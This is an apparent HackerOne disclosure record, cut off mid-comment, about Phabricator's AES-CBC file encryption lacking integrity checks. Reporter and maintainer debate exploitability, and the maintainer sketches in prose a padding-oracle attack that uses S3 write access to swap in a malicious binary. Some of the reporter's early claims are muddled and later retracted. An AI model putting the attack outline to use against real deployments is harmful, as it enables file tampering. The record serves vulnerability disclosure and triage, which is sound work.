{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2017-04-05T20:16:10.702Z", 
    "voters": [
        "tomdev", 
        "sp1d3rs", 
        "michiel", 
        "adn", 
        "spam404", 
        "kapytein", 
        "ramsexy", 
        "glc", 
        "apox", 
        "eveeez", 
        "and 8 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "750.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 216746, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2017-04-05T19:19:38.248Z", 
    "vulnerability_information": "Dear Phabricator bug bounty team,\n\n# Summary\n---\n\nPhabricator encrypts data with AES in CBC mode, but does not ensure integrity of the encrypted data. You must authenticate the data, by either using an HMAC or by using an authenticated block cipher mode like GCM.\n\n# Why does this vulnerability exist?\n---\n\n`src/applications/files/format/PhabricatorFileAES256StorageFormat.php` encrypts the data as follows without checking the integrity of the message:\n\n~~~\nprivate function encryptData(\n    $data,\n    PhutilOpaqueEnvelope $key,\n    PhutilOpaqueEnvelope $iv) {\n    $method = 'aes-256-cbc';\n    $key = $key->openEnvelope();\n    $iv = $iv->openEnvelope();\n    $result = openssl_encrypt($data, $method, $key, OPENSSL_RAW_DATA, $iv);\n    if ($result === false) {\n      throw new Exception(\n        pht(\n          'Failed to openssl_encrypt() data: %s',\n          openssl_error_string()));\n    }\n    return $result;\n}\n~~~\n\nLink to source code: https://github.com/phacility/phabricator/blob/master/src/applications/files/format/PhabricatorFileAES256StorageFormat.php\n\n# How can this be exploited?\n---\n\nBy not ensuring integrity Phabricator is vulnerable to padding oracle attacks and chosen-ciphertext attacks.\n\n# How can this be fixed?\n---\n\nAs stated previously, you must check the integrity of the data, by either using an HMAC or by using an authenticated block cipher mode like GCM.\n\nBest regards,\nEd", 
    "activity_page_count": 1, 
    "severity": {
        "metrics": {
            "confidentiality": "none", 
            "privileges_required": "none", 
            "user_interaction": "none", 
            "attack_vector": "network", 
            "attack_complexity": "low", 
            "scope": "unchanged", 
            "integrity": "low", 
            "availability": "none"
        }, 
        "rating": "medium", 
        "score": 5.3, 
        "author_type": "User"
    }, 
    "title": "Phabricator is vulnerable to padding oracle attacks and chosen-ciphertext attacks.", 
    "is_member_of_team?": null, 
    "vote_count": 18, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2017-05-05T19:19:38.300Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "activity_page_number": 1, 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$750", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2017-03-28T17:46:45.339Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-03-28T17:46:45.339Z", 
            "actor": {
                "username": "edoverflow", 
                "url": "/edoverflow", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "Just to make it clear that I have read your HackerOne policy, here is your keyword: `mongoose`.", 
            "markdown_message": "<p>Just to make it clear that I have read your HackerOne policy, here is your keyword: <code>mongoose</code>.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1568453, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-03-28T18:21:06.356Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-03-28T18:21:06.356Z", 
            "actor": {
                "username": "epriestley", 
                "url": "/epriestley", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/043/67210f4155bb8999679d01c81406df1242df0f8c_medium.jpg?1383694450"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "What steps would an attacker take to exploit this vulnerability?", 
            "markdown_message": "<p>What steps would an attacker take to exploit this vulnerability?</p>\n", 
            "type": "Activities::Comment", 
            "id": 1568541, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-03-28T19:32:54.329Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-03-28T19:32:54.329Z", 
            "actor": {
                "username": "edoverflow", 
                "url": "/edoverflow", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "Thanks for the prompt response! Unauthenticated encryption exposes the user to numerous vulnerabilities meaning their are various ways to exploit this issue. For instance, if an attacker could modify the file (possibly via bit flipping), the application should respond with an error warning the user that the file has been modified. In this case, since the application does not use a MAC tag, there is no warning.", 
            "markdown_message": "<p>Thanks for the prompt response! Unauthenticated encryption exposes the user to numerous vulnerabilities meaning their are various ways to exploit this issue. For instance, if an attacker could modify the file (possibly via bit flipping), the application should respond with an error warning the user that the file has been modified. In this case, since the application does not use a MAC tag, there is no warning.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1568686, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-03-28T19:37:33.662Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-03-28T19:37:33.662Z", 
            "actor": {
                "username": "epriestley", 
                "url": "/epriestley", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/043/67210f4155bb8999679d01c81406df1242df0f8c_medium.jpg?1383694450"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "What is a set of steps an attacker could take to modify the file (without also being able to modify the checksum)?", 
            "markdown_message": "<p>What is a set of steps an attacker could take to modify the file (without also being able to modify the checksum)?</p>\n", 
            "type": "Activities::Comment", 
            "id": 1568697, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-03-28T19:42:10.700Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-03-28T19:42:10.700Z", 
            "actor": {
                "username": "edoverflow", 
                "url": "/edoverflow", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "In that case, the attacker would probably launch a chosen ciphertext attack by using Phabricator as a decryption oracle.", 
            "markdown_message": "<p>In that case, the attacker would probably launch a chosen ciphertext attack by using Phabricator as a decryption oracle.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1568704, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-03-28T19:45:23.997Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-03-28T19:45:23.997Z", 
            "actor": {
                "username": "epriestley", 
                "url": "/epriestley", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/043/67210f4155bb8999679d01c81406df1242df0f8c_medium.jpg?1383694450"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "I'm trying to determine whether you are actually describing an attack or just copy/pasting from a best practices document with no actual insight.\n\nPlease give me a specific, plausible series of steps that an attacker can take to exploit the vulnerability you believe you are reporting in Phabricator.", 
            "markdown_message": "<p>I&#39;m trying to determine whether you are actually describing an attack or just copy/pasting from a best practices document with no actual insight.</p>\n\n<p>Please give me a specific, plausible series of steps that an attacker can take to exploit the vulnerability you believe you are reporting in Phabricator.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1568710, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-03-28T20:07:39.503Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-03-28T20:07:39.503Z", 
            "actor": {
                "username": "edoverflow", 
                "url": "/edoverflow", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "> I'm trying to determine whether you are actually describing an attack or just copy/pasting from a best practices document with no actual insight.\n\nI am terribly sorry if it comes over as that. I participate in a lot of different projects that implement crypto so I quickly assumed that you knew what all these vulnerabilities are and that you knew that unauthenticated encryption is bad.\n\n> Please give me a specific, plausible series of steps that an attacker can take to exploit the vulnerability you believe you are reporting in Phabricator.\n\n1) The Phabricator user encrypts a file with Phabricator and simply assumes that the encrypted file is now secure. Now let's assume the user stores the file on a cloud storage service (Dropbox, Google Drive etc.) and that the communication to the cloud storage service is not secure. \n2) The attacker intercepts the file. \n3) The attacker encrypts a malicious payload and replaces the ciphertext with the ecrypted payload. When the user decrypts the file, the code executes since there is no authentication.\n\nThis is one of many different plausible scenarios that I can come up with. Please let me know if you need more information.", 
            "markdown_message": "<blockquote>\n<p>I&#39;m trying to determine whether you are actually describing an attack or just copy/pasting from a best practices document with no actual insight.</p>\n</blockquote>\n\n<p>I am terribly sorry if it comes over as that. I participate in a lot of different projects that implement crypto so I quickly assumed that you knew what all these vulnerabilities are and that you knew that unauthenticated encryption is bad.</p>\n\n<blockquote>\n<p>Please give me a specific, plausible series of steps that an attacker can take to exploit the vulnerability you believe you are reporting in Phabricator.</p>\n</blockquote>\n\n<p>1) The Phabricator user encrypts a file with Phabricator and simply assumes that the encrypted file is now secure. Now let&#39;s assume the user stores the file on a cloud storage service (Dropbox, Google Drive etc.) and that the communication to the cloud storage service is not secure. <br>\n2) The attacker intercepts the file. <br>\n3) The attacker encrypts a malicious payload and replaces the ciphertext with the ecrypted payload. When the user decrypts the file, the code executes since there is no authentication.</p>\n\n<p>This is one of many different plausible scenarios that I can come up with. Please let me know if you need more information.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1568763, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-03-28T20:45:43.441Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-03-28T20:45:43.441Z", 
            "actor": {
                "username": "epriestley", 
                "url": "/epriestley", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/043/67210f4155bb8999679d01c81406df1242df0f8c_medium.jpg?1383694450"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "It really doesn't sound like you're reporting a specific vulnerability in Phabricator with a plausible path to exploitation.\n\nHow would the unwitting victim retrieve the ciphertext in order to store it in Dropbox?", 
            "markdown_message": "<p>It really doesn&#39;t sound like you&#39;re reporting a specific vulnerability in Phabricator with a plausible path to exploitation.</p>\n\n<p>How would the unwitting victim retrieve the ciphertext in order to store it in Dropbox?</p>\n", 
            "type": "Activities::Comment", 
            "id": 1568889, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-03-29T06:23:23.095Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-03-29T06:23:23.095Z", 
            "actor": {
                "username": "edoverflow", 
                "url": "/edoverflow", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "I believe I know what the issue is now. I completely misunderstood what the purpose of encryption is here. For some reason I assumed that someone setting up Phabricator (the user in my case) would be able to define where the ciphertext is stored: https://secure.phabricator.com/book/phabricator/article/configuring_file_storage/.\n\nNow I understand why you thought I was just regurgitating a best practice. Nevertheless, I want to make sure that there really isn't a vulnerability here. So I have a couple questions for you:\n\n1) Could you please explain what this code is for or could you point me in the right direction?\n2) What do you use encryption for? What are you protecting against?\n\nThank you for your patience.", 
            "markdown_message": "<p>I believe I know what the issue is now. I completely misunderstood what the purpose of encryption is here. For some reason I assumed that someone setting up Phabricator (the user in my case) would be able to define where the ciphertext is stored: <a title=\"https://secure.phabricator.com/book/phabricator/article/configuring_file_storage/\" href=\"/redirect?signature=0183d3e6e7cc57273b3d32886d7eefbeffbf4509&amp;url=https%3A%2F%2Fsecure.phabricator.com%2Fbook%2Fphabricator%2Farticle%2Fconfiguring_file_storage%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://secure.phabricator.com/book/phabricator/article/configuring_file_storage/</span><i class=\"icon-external-link\"></i></a>.</p>\n\n<p>Now I understand why you thought I was just regurgitating a best practice. Nevertheless, I want to make sure that there really isn&#39;t a vulnerability here. So I have a couple questions for you:</p>\n\n<p>1) Could you please explain what this code is for or could you point me in the right direction?<br>\n2) What do you use encryption for? What are you protecting against?</p>\n\n<p>Thank you for your patience.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1569564, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-03-29T07:11:59.800Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-03-29T07:11:59.800Z", 
            "actor": {
                "username": "epriestley", 
                "url": "/epriestley", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/043/67210f4155bb8999679d01c81406df1242df0f8c_medium.jpg?1383694450"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "In some cases, installs have their own application servers in a high-trust datacenter, but want to use S3 as a file storage engine for whatever reason (for example, because they don't want the operational overhead of swapping disks or allocating storage or dealing with huge backups).\n\nStoring file blobs encrypted in S3 protects these installs against attacks by AWS employees or attackers who can mount an attack on an AWS datacenter directly (in an extreme case, state actors storming an AWS facility and taking hardware by force). This encryption reduces the amount of trust which needs to be placed in S3/AWS.\n\nIn other cases, installs don't actually care about security or any specific attack, but have a policy which requires or encourages data to be stored encrypted. In these cases, the feature need not provide any actual security benefit, just satisfy the letter of the policy. Installs which have expressed interest in encryption from this angle have generally not actually cared that the encryption is provable, secure, observable, or even that it protects against any specific attack scenario: they're just following a policy that says encryption is good.\n\nWe have not implemented the feature to address these cases, although we've probably seen more of these cases than \"S3 vs Trusted Datacenter\" cases. Particularly, we specifically avoided implementing the unprovable \"encrypt data\" S3 checkbox that AWS offers (you can find some discussion in <https://secure.phabricator.com/D10176>) in favor of a scheme which at least protects against some set of attackers, however implausible it may be that Chinese commandos are going to storm an AWS datacenter.\n\nI think there may be a legitimate -- if somewhat far-fetched -- attack here:\n\n  - Compromise the file storage engine (e.g., S3) and gain read and write access.\n  - Compromise a Phabricator user account.\n  - You can only use Phabricator as a padding oracle for files your user account can read, so identify some readable file which you can trick a more privileged user into executing (`trustworthy.exe`).\n  - Conduct a padding oracle attack by writing blocks into S3 and reading from the web UI. You can read the file, so you have the plaintext, and you control S3 so you have the cipher text, and can rewrite the cipher text. You do not control an application server so you do not have the IV or encryption key. Note that each 4MB block of each file uses a unique key and IV, so I believe you can't do any kind of sideways attack where you use your permission on some files to compromise other files. Nor can you directly attack the master encryption key on the keyring.\n  - Your goal is to use the padding oracle to discover the correct ciphertext for an alternate binary (`evil.exe`) so you can replace the ciphertext on disk. I'm unsure if this is actually possible. If it is, I'm unsure if it's practical. For example, you must make a web request for each query to the oracle, and that request must make a service call to S3 and load the blob, so even a relatively low-complexity attack might be stretched to an unrealistically long timeframe.\n  - Once you've discovered the ciphertext for `evil.exe`, you replace it on disk in S3 and then wait for your victim to download and execute the file from Phabricator (or encourage them to do so).\n\nThis requires you to compromise S3 and a user account, but be unable to compromise an application host (if you could, you could just read the encryption key). State attackers raiding datacenters probably don't have time to conduct this attack and would have to separately compromise an account.\n\nAn employee might more reasonably have an account and be able to gain AWS credentials to access S3. These credentials should normally be stored alongside the keyring and subject to the same security protocols, but realistically installs probably use AWS for more things than Phabricator and may not set up single-use credentials for it. In most cases this probably boils down to a social engineering attack where the major compromise is convincing a privileged coworker to run a binary. Perhaps this oracle-based approach could tip the balance and let this attack succeed where it would otherwise fail, but I don't think routine workflows normally lead users to regularly execute binaries from Phabricator or place any particular trust in them.\n\nWhether this attack is actually possible or not, I think checksumming blobs is probably worth implementing anyway. It may not really defuse any attack here, but there's some value in just having an integrity checksum and it's not particularly difficult to implement. But I'd like better evidence that this attack represents a real threat rather than a purely theoretical one before prioritizing this as a security issue.\n\nThere are some other bugs in adjacent areas of the code (notably <https://secure.phabricator.com/T12079>) and we make some use of SHA1, which we should move away from now that a collision has been found, but my current thinking is that none of this is sufficiently alarming to prioritize as a security concern and that we can just fix it all the next time we're working in that area of the product.\n\nGiven this:\n\n  - Can you construct a more concerning attack?\n  - Do you think the attack I describe above is actually more concerning than I'm assessing it to be?", 
            "markdown_message": "<p>In some cases, installs have their own application servers in a high-trust datacenter, but want to use S3 as a file storage engine for whatever reason (for example, because they don&#39;t want the operational overhead of swapping disks or allocating storage or dealing with huge backups).</p>\n\n<p>Storing file blobs encrypted in S3 protects these installs against attacks by AWS employees or attackers who can mount an attack on an AWS datacenter directly (in an extreme case, state actors storming an AWS facility and taking hardware by force). This encryption reduces the amount of trust which needs to be placed in S3/AWS.</p>\n\n<p>In other cases, installs don&#39;t actually care about security or any specific attack, but have a policy which requires or encourages data to be stored encrypted. In these cases, the feature need not provide any actual security benefit, just satisfy the letter of the policy. Installs which have expressed interest in encryption from this angle have generally not actually cared that the encryption is provable, secure, observable, or even that it protects against any specific attack scenario: they&#39;re just following a policy that says encryption is good.</p>\n\n<p>We have not implemented the feature to address these cases, although we&#39;ve probably seen more of these cases than &quot;S3 vs Trusted Datacenter&quot; cases. Particularly, we specifically avoided implementing the unprovable &quot;encrypt data&quot; S3 checkbox that AWS offers (you can find some discussion in <a title=\"https://secure.phabricator.com/D10176\" href=\"/redirect?signature=72a164a83ad055772950629e5e3434f43751479c&amp;url=https%3A%2F%2Fsecure.phabricator.com%2FD10176\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://secure.phabricator.com/D10176</span><i class=\"icon-external-link\"></i></a>) in favor of a scheme which at least protects against some set of attackers, however implausible it may be that Chinese commandos are going to storm an AWS datacenter.</p>\n\n<p>I think there may be a legitimate -- if somewhat far-fetched -- attack here:</p>\n\n<ul>\n<li>Compromise the file storage engine (e.g., S3) and gain read and write access.</li>\n<li>Compromise a Phabricator user account.</li>\n<li>You can only use Phabricator as a padding oracle for files your user account can read, so identify some readable file which you can trick a more privileged user into executing (<code>trustworthy.exe</code>).</li>\n<li>Conduct a padding oracle attack by writing blocks into S3 and reading from the web UI. You can read the file, so you have the plaintext, and you control S3 so you have the cipher text, and can rewrite the cipher text. You do not control an application server so you do not have the IV or encryption key. Note that each 4MB block of each file uses a unique key and IV, so I believe you can&#39;t do any kind of sideways attack where you use your permission on some files to compromise other files. Nor can you directly attack the master encryption key on the keyring.</li>\n<li>Your goal is to use the padding oracle to discover the correct ciphertext for an alternate binary (<code>evil.exe</code>) so you can replace the ciphertext on disk. I&#39;m unsure if this is actually possible. If it is, I&#39;m unsure if it&#39;s practical. For example, you must make a web request for each query to the oracle, and that request must make a service call to S3 and load the blob, so even a relatively low-complexity attack might be stretched to an unrealistically long timeframe.</li>\n<li>Once you&#39;ve discovered the ciphertext for <code>evil.exe</code>, you replace it on disk in S3 and then wait for your victim to download and execute the file from Phabricator (or encourage them to do so).</li>\n</ul>\n\n<p>This requires you to compromise S3 and a user account, but be unable to compromise an application host (if you could, you could just read the encryption key). State attackers raiding datacenters probably don&#39;t have time to conduct this attack and would have to separately compromise an account.</p>\n\n<p>An employee might more reasonably have an account and be able to gain AWS credentials to access S3. These credentials should normally be stored alongside the keyring and subject to the same security protocols, but realistically installs probably use AWS for more things than Phabricator and may not set up single-use credentials for it. In most cases this probably boils down to a social engineering attack where the major compromise is convincing a privileged coworker to run a binary. Perhaps this oracle-based approach could tip the balance and let this attack succeed where it would otherwise fail, but I don&#39;t think routine workflows normally lead users to regularly execute binaries from Phabricator or place any particular trust in them.</p>\n\n<p>Whether this attack is actually possible or not, I think checksumming blobs is probably worth implementing anyway. It may not really defuse any attack here, but there&#39;s some value in just having an integrity checksum and it&#39;s not particularly difficult to implement. But I&#39;d like better evidence that this attack represents a real threat rather than a purely theoretical one before prioritizing this as a security issue.</p>\n\n<p>There are some other bugs in adjacent areas of the code (notably <a title=\"https://secure.phabricator.com/T12079\" href=\"/redirect?signature=174d7adf937a8cbd127a5705d4d35fd589366819&amp;url=https%3A%2F%2Fsecure.phabricator.com%2FT12079\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://secure.phabricator.com/T12079</span><i class=\"icon-external-link\"></i></a>) and we make some use of SHA1, which we should move away from now that a collision has been found, but my current thinking is that none of this is sufficiently alarming to prioritize as a security concern and that we can just fix it all the next time we&#39;re working in that area of the product.</p>\n\n<p>Given this:</p>\n\n<ul>\n<li>Can you construct a more concerning attack?</li>\n<li>Do you think the attack I describe above is actually more concerning than I&#39;m assessing it to be?</li>\n</ul>\n", 
            "type": "Activities::Comment", 
            "id": 1569606, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-03-29T17:01:15.697Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-03-29T17:01:56.473Z", 
            "actor": {
                "username": "edoverflow", 
                "url": "/edoverflow", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "**That is hands down the best response I have ever had from a bug bounty report. Thank you for taking the time to explain everything thoroughly.** I will brake my response down and address individual parts of your response.\n\n> Storing file blobs encrypted in S3 protects these installs against attacks by AWS employees or attackers who can mount an attack on an AWS datacenter directly (in an extreme case, state actors storming an AWS facility and taking hardware by force). This encryption reduces the amount of trust which needs to be placed in S3/AWS.\n\nOK, so while very unlikely, a rogue AWS employee could potentially exploit this vulnerability without having to have access to the victim's Phabricator account.\n\n> In other cases, installs don't actually care about security or any specific attack, but have a policy which requires or encourages data to be stored encrypted. In these cases, the feature need not provide any actual security benefit, just satisfy the letter of the policy. Installs which have expressed interest in encryption from this angle have generally not actually cared that the encryption is provable, secure, observable, or even that it protects against any specific attack scenario: they're just following a policy that says encryption is good.\n\nThis raises a new issue for me. Although Phabricator is not directly to blame here, no encryption is almost better than \"bad\" encryption, since this could potentially give another user (keep in mind I am using the term user to define somebody setting up their own installation of Phabricator) a false sense of security. I will come back to this later on. [1]\n\n> We have not implemented the feature to address these cases, although we've probably seen more of these cases than \"S3 vs Trusted Datacenter\" cases. Particularly, we specifically avoided implementing the unprovable \"encrypt data\" S3 checkbox that AWS offers (you can find some discussion in https://secure.phabricator.com/D10176) in favor of a scheme which at least protects against some set of attackers, however implausible it may be that Chinese commandos are going to storm an AWS datacenter.\n\nFair enough.\n\n> I think there may be a legitimate -- if somewhat far-fetched -- attack here: [...]\n\nI will come back to this when reevaluating the severity of the issue. [2]\n\n> An employee might more reasonably have an account and be able to gain AWS credentials to access S3. These credentials should normally be stored alongside the keyring and subject to the same security protocols, but realistically installs probably use AWS for more things than Phabricator and may not set up single-use credentials for it. In most cases this probably boils down to a social engineering attack where the major compromise is convincing a privileged coworker to run a binary. Perhaps this oracle-based approach could tip the balance and let this attack succeed where it would otherwise fail, but I don't think routine workflows normally lead users to regularly execute binaries from Phabricator or place any particular trust in them.\n\nSo this is where I go back to [1]. If I understood correctly you only mention social engineering an AWS employee, but I believe the false sense of security could mean that the attacker may have an easier time trying to trick the user.\n\n> Whether this attack is actually possible or not, I think checksumming blobs is probably worth implementing anyway. It may not really defuse any attack here, but there's some value in just having an integrity checksum and it's not particularly difficult to implement.\n\nThis is a very good idea, but at the same time you should add an authentication mechanism. Some users may ignore checksum mismatches and completely rely on the decryption process ensuring integrity.\n\n> But I'd like better evidence that this attack represents a real threat rather than a purely theoretical one before prioritizing this as a security issue.\n\nFinally, I am still confident that this issues could be exploited in combination with other issues, such as the false sense of security. Therefore, to help you prioritise this security issue we should use the following CVSS score: `CVSS:3.0/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:L/A:N` -> **2.2 (Low)** [2]\n\nThe attack scenarios are all hard to pull off (`AC:H`) and the attacker requires high privileges in order to mount the attack (`PR:H`).\n\n> Can you construct a more concerning attack?\n\nNo. I can only make the two first steps easier with the false sense of security and possibly combining other vulnerabilities. \n\nAfter doing a little research I found a similar [report](https://hackerone.com/reports/108082) that still requires high user privileges, but demonstrates bit flipping an executable fairly well. Please note that the payload would still only be 16 bytes in CBC mode. What do you think? Is this still impractical?\n\n> Do you think the attack I describe above is actually more concerning than I'm assessing it to be?\n\nAs stated earlier, while still not a serious issue (2.2 (Low)), the severity of the issue is not `None` and therefore I believe this should be addressed accordingly (Low priority).\n\nOnce again, thank you very much for helping me understand the issue. Do you mind if I give you a shout out on Twitter? :)", 
            "markdown_message": "<p><strong>That is hands down the best response I have ever had from a bug bounty report. Thank you for taking the time to explain everything thoroughly.</strong> I will brake my response down and address individual parts of your response.</p>\n\n<blockquote>\n<p>Storing file blobs encrypted in S3 protects these installs against attacks by AWS employees or attackers who can mount an attack on an AWS datacenter directly (in an extreme case, state actors storming an AWS facility and taking hardware by force). This encryption reduces the amount of trust which needs to be placed in S3/AWS.</p>\n</blockquote>\n\n<p>OK, so while very unlikely, a rogue AWS employee could potentially exploit this vulnerability without having to have access to the victim&#39;s Phabricator account.</p>\n\n<blockquote>\n<p>In other cases, installs don&#39;t actually care about security or any specific attack, but have a policy which requires or encourages data to be stored encrypted. In these cases, the feature need not provide any actual security benefit, just satisfy the letter of the policy. Installs which have expressed interest in encryption from this angle have generally not actually cared that the encryption is provable, secure, observable, or even that it protects against any specific attack scenario: they&#39;re just following a policy that says encryption is good.</p>\n</blockquote>\n\n<p>This raises a new issue for me. Although Phabricator is not directly to blame here, no encryption is almost better than &quot;bad&quot; encryption, since this could potentially give another user (keep in mind I am using the term user to define somebody setting up their own installation of Phabricator) a false sense of security. I will come back to this later on. [1]</p>\n\n<blockquote>\n<p>We have not implemented the feature to address these cases, although we&#39;ve probably seen more of these cases than &quot;S3 vs Trusted Datacenter&quot; cases. Particularly, we specifically avoided implementing the unprovable &quot;encrypt data&quot; S3 checkbox that AWS offers (you can find some discussion in <a title=\"https://secure.phabricator.com/D10176\" href=\"/redirect?signature=72a164a83ad055772950629e5e3434f43751479c&amp;url=https%3A%2F%2Fsecure.phabricator.com%2FD10176\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://secure.phabricator.com/D10176</span><i class=\"icon-external-link\"></i></a>) in favor of a scheme which at least protects against some set of attackers, however implausible it may be that Chinese commandos are going to storm an AWS datacenter.</p>\n</blockquote>\n\n<p>Fair enough.</p>\n\n<blockquote>\n<p>I think there may be a legitimate -- if somewhat far-fetched -- attack here: [...]</p>\n</blockquote>\n\n<p>I will come back to this when reevaluating the severity of the issue. [2]</p>\n\n<blockquote>\n<p>An employee might more reasonably have an account and be able to gain AWS credentials to access S3. These credentials should normally be stored alongside the keyring and subject to the same security protocols, but realistically installs probably use AWS for more things than Phabricator and may not set up single-use credentials for it. In most cases this probably boils down to a social engineering attack where the major compromise is convincing a privileged coworker to run a binary. Perhaps this oracle-based approach could tip the balance and let this attack succeed where it would otherwise fail, but I don&#39;t think routine workflows normally lead users to regularly execute binaries from Phabricator or place any particular trust in them.</p>\n</blockquote>\n\n<p>So this is where I go back to [1]. If I understood correctly you only mention social engineering an AWS employee, but I believe the false sense of security could mean that the attacker may have an easier time trying to trick the user.</p>\n\n<blockquote>\n<p>Whether this attack is actually possible or not, I think checksumming blobs is probably worth implementing anyway. It may not really defuse any attack here, but there&#39;s some value in just having an integrity checksum and it&#39;s not particularly difficult to implement.</p>\n</blockquote>\n\n<p>This is a very good idea, but at the same time you should add an authentication mechanism. Some users may ignore checksum mismatches and completely rely on the decryption process ensuring integrity.</p>\n\n<blockquote>\n<p>But I&#39;d like better evidence that this attack represents a real threat rather than a purely theoretical one before prioritizing this as a security issue.</p>\n</blockquote>\n\n<p>Finally, I am still confident that this issues could be exploited in combination with other issues, such as the false sense of security. Therefore, to help you prioritise this security issue we should use the following CVSS score: <code>CVSS:3.0/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:L/A:N</code> -&gt; <strong>2.2 (Low)</strong> [2]</p>\n\n<p>The attack scenarios are all hard to pull off (<code>AC:H</code>) and the attacker requires high privileges in order to mount the attack 